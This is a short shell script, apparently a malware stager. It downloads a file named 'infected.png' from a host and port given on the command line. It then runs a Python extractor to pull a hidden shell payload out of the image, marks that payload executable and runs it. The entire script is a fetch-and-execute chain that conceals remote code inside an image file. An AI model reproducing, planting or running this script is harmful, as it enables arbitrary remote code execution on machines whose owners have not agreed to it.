#!/bin/sh

curl -o infected.png http://"$1":"$2"/infected.png

python3 extractor.py infected.png payload.sh

chmod +x payload.sh

./payload.sh
